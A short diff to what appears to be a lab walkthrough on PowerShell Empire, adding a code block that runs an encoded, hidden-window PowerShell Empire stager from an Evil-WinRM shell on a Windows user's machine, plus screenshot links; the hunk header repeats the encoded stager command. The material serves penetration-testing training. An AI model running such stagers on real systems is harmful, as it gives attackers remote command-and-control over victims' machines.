@@ -302,6 +302,13 @@ powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIAcwBJAG8AbgBUAGEAQgBsAGUA
 <p>5.1. Stager successfully calls back to Empire from Evil-WinRM<br>
 <code>No answer needed</code></p>
 
+```bash
+*Evil-WinRM* PS C:\Users\Sam\Documents> powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIA...=
+```
+
+<img width="1249" height="773" alt="image" src="https://github.com/user-attachments/assets/5c3bfe9f-53e1-4fbf-93ab-b067868a7404" />
+
+
 <img width="1338" height="581" alt="image" src="https://github.com/user-attachments/assets/119865e6-91bb-47e4-afd1-03f5f34ff852" />
 
 <img width="1335" height="779" alt="image" src="https://github.com/user-attachments/assets/a216a2ec-c1ea-4060-82c7-1c5af531633a" />
